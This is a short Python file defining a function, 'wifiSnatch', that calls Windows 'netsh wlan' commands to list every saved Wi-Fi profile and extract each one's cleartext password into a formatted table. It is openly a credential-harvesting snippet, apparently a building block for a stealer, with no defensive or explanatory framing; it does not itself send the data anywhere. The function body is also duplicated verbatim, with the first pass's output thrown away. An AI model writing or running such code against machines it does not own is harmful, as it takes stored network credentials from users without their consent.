import subprocess


def wifiSnatch():
  data = subprocess.check_output(['netsh', 'wlan', 'show',
                                  'profiles']).decode('utf-8').split('\n')
  profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]

  output = []  # Create an empty list to store the output lines

  for i in profiles:
    results = subprocess.check_output(
        ['netsh', 'wlan', 'show', 'profile', i,
         'key=clear']).decode('utf-8').split('\n')
    results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
    try:
      output.append("{:<30}|  {:<}".format(i, results[0]))
    except IndexError:
      output.append("{:<30}|  {:<}".format(i, ""))

  # Join the lines in the output list into a single string with line breaks
  data = subprocess.check_output(['netsh', 'wlan', 'show',
                                  'profiles']).decode('utf-8').split('\n')
  profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]

  output = []  # Create an empty list to store the output lines

  for i in profiles:
    results = subprocess.check_output(
        ['netsh', 'wlan', 'show', 'profile', i,
         'key=clear']).decode('utf-8').split('\n')
    results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
    try:
      output.append("{:<30}|  {:<}".format(i, results[0]))
    except IndexError:
      output.append("{:<30}|  {:<}".format(i, ""))

  # Join the lines in the output list into a single string with line breaks
  output_string = '\n'.join(output)
  return (output_string)
